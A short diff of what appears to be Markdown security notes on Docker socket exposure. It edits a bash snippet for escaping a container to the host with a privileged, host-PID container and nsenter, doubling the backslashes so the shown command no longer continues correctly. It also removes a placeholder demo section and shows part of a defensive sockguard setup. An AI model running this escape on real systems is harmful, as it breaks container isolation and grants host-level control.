@@ -5,10 +5,10 @@
 If able to start containers, just leave the isolation:
 
 ```bash
-docker run -it \
-    --privileged \
-    --pid=host \
-    alpine \
+docker run -it \\
+    --privileged \\
+    --pid=host \\
+    alpine \\
 	nsenter -t 1 -m -u -n -i sh
 ```
 
@@ -46,11 +46,3 @@ For example [`sockguard`](https://github.com/buildkite/sockguard)
     -upstream-socket /var/run/docker-raw.sock \
     -filename /var/run/docker.sock
 ```
-
---
-
-## Demo: sockguard
-
-XXX
-
-<!-- include: sockguard-0.command -->
